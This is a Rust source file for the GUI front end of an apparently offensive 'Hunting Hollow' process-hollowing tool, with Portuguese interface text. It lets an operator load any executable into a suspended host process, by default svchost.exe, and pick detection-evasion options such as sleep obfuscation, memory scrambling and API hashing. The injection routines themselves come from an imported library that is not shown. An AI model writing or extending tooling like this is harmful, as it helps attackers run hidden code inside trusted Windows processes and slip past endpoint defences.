use eframe::egui;
use std::sync::{Arc, Mutex};
use std::time::Instant;
use sysinfo::System;

use hunting_hollow::hollow::{ProcessHollower, ObfuscationTechnique};

struct HuntingHollowApp {
    hollow: Arc<Mutex<ProcessHollower>>,
    target_path: String,
    host_path: String,
    status: String,
    is_running: bool,
    continuous_mode: bool,
    obfuscation_technique: ObfuscationTechnique,
    logs: Vec<String>,
    system_info: System,
    start_time: Option<Instant>,
    success_count: u32,
    failure_count: u32,
}

impl Default for HuntingHollowApp {
    fn default() -> Self {
        let mut system = System::new_all();
        system.refresh_all();

        Self {
            hollow: Arc::new(Mutex::new(ProcessHollower::new())),
            target_path: String::new(),
            host_path: "C:\\Windows\\System32\\svchost.exe".to_string(),
            status: "Pronto".to_string(),
            is_running: false,
            continuous_mode: false,
            obfuscation_technique: ObfuscationTechnique::AllTechniques,
            logs: Vec::new(),
            system_info: system,
            start_time: None,
            success_count: 0,
            failure_count: 0,
        }
    }
}

impl HuntingHollowApp {
    fn add_log(&mut self, message: String) {
        self.logs.push(format!("[{}] {}", chrono::Local::now().format("%H:%M:%S"), message));
        if self.logs.len() > 100 {
            self.logs.remove(0);
        }
    }

    fn start_hollowing(&mut self) {
        if self.target_path.is_empty() {
            self.status = "Erro: Selecione um arquivo alvo".to_string();
            return;
        }

        let target_path = self.target_path.clone();
        let host_path = self.host_path.clone();
        let obfuscation = self.obfuscation_technique;

        self.is_running = true;
        self.start_time = Some(Instant::now());
        self.status = "Iniciando hollowing...".to_string();
        self.add_log("Iniciando processo de hollowing".to_string());

        // Executar na thread principal para evitar problemas de concorrência
        let result = match self.execute_hollowing(&target_path, &host_path, obfuscation) {
            Ok(_) => {
                self.success_count += 1;
                "Hollowing concluído com sucesso!".to_string()
            }
            Err(e) => {
                self.failure_count += 1;
                format!("Erro: {}", e)
            }
        };

        self.status = result.clone();
        self.add_log(result);
        self.is_running = false;
    }

    fn execute_hollowing(&mut self, target_path: &str, host_path: &str, obfuscation: ObfuscationTechnique) -> anyhow::Result<()> {
        // Primeiro, encontre o melhor host (se necessário) e faça todos os logs
        let actual_host = if host_path.is_empty() {
            let hollow = self.hollow.lock().unwrap();
            hollow.find_best_host().unwrap_or_else(|| {
                "C:\\Windows\\System32\\svchost.exe".to_string()
            })
        } else {
            host_path.to_string()
        };

        self.add_log(format!("Criando processo suspenso: {}", actual_host));
        
        // Agora execute todas as operações com hollow de uma vez
        let result = {
            let mut hollow = self.hollow.lock().unwrap();
            hollow.set_obfuscation(obfuscation);
            
            let create_result = hollow.create_suspended_process(&actual_host);
            
            if create_result.is_ok() {
                self.add_log(format!("Executando hollowing com: {}", target_path));
                hollow.perform_hollowing(target_path)
            } else {
                create_result
            }
        };
        
        result?;
        
        Ok(())
    }

    fn stop_hollowing(&mut self) {
        self.is_running = false;
        self.status = "Parando hollowing...".to_string();
        self.add_log("Parando hollowing".to_string());
        
        let mut hollow = self.hollow.lock().unwrap();
        hollow.cleanup();
        self.status = "Hollowing parado".to_string();
    }

    fn update_system_info(&mut self) {
        self.system_info.refresh_all();
    }
}

impl eframe::App for HuntingHollowApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        self.update_system_info();

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("🕵️ Hunting Hollow - Process Hollowing Tool");

            ui.separator();

            // Configurações principais
            ui.horizontal(|ui| {
                ui.vertical(|ui| {
                    ui.label("Arquivo Alvo:");
                    ui.text_edit_singleline(&mut self.target_path);
                    if ui.button("📁 Procurar...").clicked() {
                        // Implementação simplificada sem rfd
                        self.target_path = "C:\\path\\to\\your\\executable.exe".to_string();
                    }
                });

                ui.vertical(|ui| {
                    ui.label("Processo Host:");
                    ui.text_edit_singleline(&mut self.host_path);
                    if ui.button("🔍 Auto").clicked() {
                        let hollow = self.hollow.lock().unwrap();
                        if let Some(host) = hollow.find_best_host() {
                            self.host_path = host;
                        }
                    }
                });
            });

            ui.separator();

            // Configurações de obfuscação
            ui.horizontal(|ui| {
                ui.label("Técnica de Obfuscação:");
                egui::ComboBox::from_label("")
                    .selected_text(match self.obfuscation_technique {
                        ObfuscationTechnique::None => "Nenhuma",
                        ObfuscationTechnique::SleepObfuscation => "Sleep",
                        ObfuscationTechnique::MemoryScrambling => "Memory Scrambling",
                        ObfuscationTechnique::ApiHashing => "API Hashing",
                        ObfuscationTechnique::AllTechniques => "Todas",
                    })
                    .show_ui(ui, |ui| {
                        ui.selectable_value(&mut self.obfuscation_technique, ObfuscationTechnique::None, "Nenhuma");
                        ui.selectable_value(&mut self.obfuscation_technique, ObfuscationTechnique::SleepObfuscation, "Sleep");
                        ui.selectable_value(&mut self.obfuscation_technique, ObfuscationTechnique::MemoryScrambling, "Memory Scrambling");
                        ui.selectable_value(&mut self.obfuscation_technique, ObfuscationTechnique::ApiHashing, "API Hashing");
                        ui.selectable_value(&mut self.obfuscation_technique, ObfuscationTechnique::AllTechniques, "Todas");
                    });
            });

            ui.separator();

            // Botões de controle
            ui.horizontal(|ui| {
                if ui.button("▶️ Iniciar Hollowing").clicked() && !self.is_running {
                    self.start_hollowing();
                }

                if ui.button("⏹️ Parar").clicked() && self.is_running {
                    self.stop_hollowing();
                }
            });

            ui.separator();

            // Status e estatísticas
            ui.horizontal(|ui| {
                ui.vertical(|ui| {
                    ui.label(format!("Status: {}", self.status));
                    ui.label(format!("Sucessos: {}", self.success_count));
                    ui.label(format!("Falhas: {}", self.failure_count));
                });
                
                ui.vertical(|ui| {
                    ui.label(format!("Processos ativos: {}", self.system_info.processes().len()));
                    ui.label(format!("Memória usada: {:.2} MB", self.system_info.used_memory() as f64 / 1024.0 / 1024.0));
                });
            });

            ui.separator();

            // Logs
            ui.label("📋 Logs:");
            egui::ScrollArea::vertical()
                .max_height(200.0)
                .show(ui, |ui| {
                    for log in &self.logs {
                        ui.label(log);
                    }
                });
        });
    }
}

fn main() -> eframe::Result<()> {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([800.0, 600.0])
            .with_min_inner_size([600.0, 400.0]),
        ..Default::default()
    };

    eframe::run_native(
        "Hunting Hollow",
        options,
        Box::new(|_cc| Box::new(HuntingHollowApp::default())),
    )
}